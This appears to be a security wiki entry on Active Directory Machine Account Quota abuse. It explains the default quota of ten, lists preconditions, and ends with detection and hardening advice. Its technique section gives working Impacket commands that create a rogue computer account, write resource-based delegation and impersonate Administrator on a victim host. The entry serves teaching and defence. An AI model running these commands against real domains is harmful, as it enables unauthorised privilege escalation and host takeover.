---
title: Machine Account Quota (MAQ) Abuse
slug: machine-account-quota-abuse
---

> **TL;DR:** The default `ms-DS-MachineAccountQuota=10` lets any authenticated domain user create up to ten computer objects, fueling RBCD takeovers and the Sam-The-Admin chain.

## What it is
`ms-DS-MachineAccountQuota` is a domain-level attribute that controls how many workstation objects a non-privileged principal can join to the domain. Microsoft has shipped a default value of 10 since Windows 2000, and Charlie Clark/Will Schroeder repopularised the abuse in 2021 through the Sam-The-Admin (CVE-2021-42278/42287) and RBCD trees. Outcome: a low-privileged user manufactures a controlled computer account, then chains it into delegation, certificate, or relay attacks for SYSTEM on a target host.

## Preconditions / where it applies
- Authenticated domain user with no other privileges
- Domain `ms-DS-MachineAccountQuota` > 0 (default 10)
- Network reach to LDAP/SAMR on a DC and to the victim host for the follow-on attack
- Target host writable `msDS-AllowedToActOnBehalfOfOtherIdentity` (for RBCD) or DC unpatched (Sam-The-Admin)

## Technique
Create a controlled computer object with Impacket and wire it into RBCD.

```bash
# 1. Add a new computer account (uses MAQ)
impacket-addcomputer corp.local/lowpriv:'Password1!' \
    -computer-name 'EVIL$' -computer-pass 'Evil123!' \
    -dc-host dc01.corp.local

# 2. Write RBCD on the victim using the new SPN-holder
impacket-rbcd corp.local/lowpriv:'Password1!' \
    -delegate-from 'EVIL$' -delegate-to 'WS01$' \
    -action write -dc-ip 10.0.0.10

# 3. S4U2Self/S4U2Proxy to impersonate Administrator on WS01
impacket-getST -spn cifs/ws01.corp.local \
    -impersonate Administrator \
    corp.local/'EVIL$':'Evil123!'
```

PowerView equivalent for enumeration: `Get-DomainObject -Identity 'DC=corp,DC=local' -Properties ms-DS-MachineAccountQuota`.

## Detection and defence
- Event ID 4741 (computer account created) — alert when the *Subject* SID is a regular user, not a DA/admin
- Event ID 5136 modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Set `ms-DS-MachineAccountQuota=0` and delegate `SeMachineAccountPrivilege` to a tightly scoped group
- Defender for Identity rule "Suspicious additions to sensitive groups" and PingCastle MAQ check
- Hunt for newly created computer objects with no `dNSHostName` or `operatingSystem` populated

## References
- [Kerberos Resource-Based Constrained Delegation (Elad Shamir)](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) — original RBCD primer
- [sAMAccountName spoofing (CVE-2021-42278) write-up](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) — Sam-The-Admin chain

See also: [[resource-based-constrained-delegation]], [[s4u2self-abuse]], [[acl-abuse]].
